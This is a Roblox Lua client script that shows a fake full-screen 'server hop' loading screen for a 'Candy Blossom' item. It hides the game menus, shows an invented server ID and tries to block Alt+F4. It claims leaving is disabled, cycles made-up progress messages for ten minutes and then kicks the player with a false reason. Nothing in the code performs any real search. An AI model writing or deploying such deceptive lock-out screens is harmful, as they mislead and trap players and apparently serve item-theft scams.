local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Hide all CoreGui (inventory, menu, leaderboard)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Optional: Fullscreen mode (not all phones support)
pcall(function()
	game:GetService("GuiService"):ToggleFullscreen()
end)

-- Try block Alt+F4 (for PC users)
UserInputService.InputBegan:Connect(function(input, processed)
	if input.KeyCode == Enum.KeyCode.F4 and UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) then
		return true
	end
end)

-- Create GUI
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "MobileLoadingScreen"
screenGui.ResetOnSpawn = false

-- Full background
local bg = Instance.new("Frame", screenGui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BackgroundTransparency = 1
TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()

-- Top info: player + fake server
local infoLabel = Instance.new("TextLabel", bg)
infoLabel.Size = UDim2.new(1, -20, 0, 30)
infoLabel.Position = UDim2.new(0, 10, 0.04, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
infoLabel.TextScaled = true
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextWrapped = true
infoLabel.Text = "User: " .. player.Name .. " | Server ID: S-" .. math.random(100000,999999) .. "-" .. math.random(1000,9999)

-- Status message
local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, -20, 0, 60)
label.Position = UDim2.new(0, 10, 0.42, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextWrapped = true
label.Text = "Initializing..."

-- Progress bar background
local barFrame = Instance.new("Frame", bg)
barFrame.Size = UDim2.new(0.8, 0, 0.035, 0)
barFrame.Position = UDim2.new(0.1, 0, 0.52, 0)
barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barFrame.BorderSizePixel = 0
Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 8)

-- Progress bar fill
local fill = Instance.new("Frame", barFrame)
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
fill.BorderSizePixel = 0
Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 8)

-- Percent label
local percentLabel = Instance.new("TextLabel", bg)
percentLabel.Size = UDim2.new(1, -20, 0, 40)
percentLabel.Position = UDim2.new(0, 10, 0.58, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
percentLabel.TextScaled = true
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextWrapped = true
percentLabel.Text = "0%"

-- Leave warning
local warning = Instance.new("TextLabel", bg)
warning.Size = UDim2.new(1, -20, 0, 30)
warning.Position = UDim2.new(0, 10, 0.93, 0)
warning.BackgroundTransparency = 1
warning.TextColor3 = Color3.fromRGB(200, 60, 60)
warning.TextScaled = true
warning.Font = Enum.Font.GothamSemibold
warning.TextWrapped = true
warning.Text = "⚠ Leaving is disabled during this operation."

-- Message pool
local messages = {
	"Finding server to hop...",
	"Locating Candy Blossom...",
	"Searching legacy server list...",
	"Pinging alternate regions...",
	"Retrying connection...",
	"Still looking for Candy Blossom...",
	"Final attempt in progress..."
}

-- Animate progress bar over 600s
TweenService:Create(fill, TweenInfo.new(600, Enum.EasingStyle.Linear), {
	Size = UDim2.new(1, 0, 1, 0)
}):Play()

-- Loop: update message + percent every second
task.spawn(function()
	for i = 1, 600 do
		local percent = math.floor((i / 600) * 100)
		percentLabel.Text = percent .. "%"
		if i % 10 == 0 then
			label.Text = messages[((i // 10 - 1) % #messages) + 1]
		end
		wait(1)
	end

	-- Restore GUIs, then kick
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	player:Kick("Couldn't find another old server with Candy Blossom. Please try rejoining later.")
end)
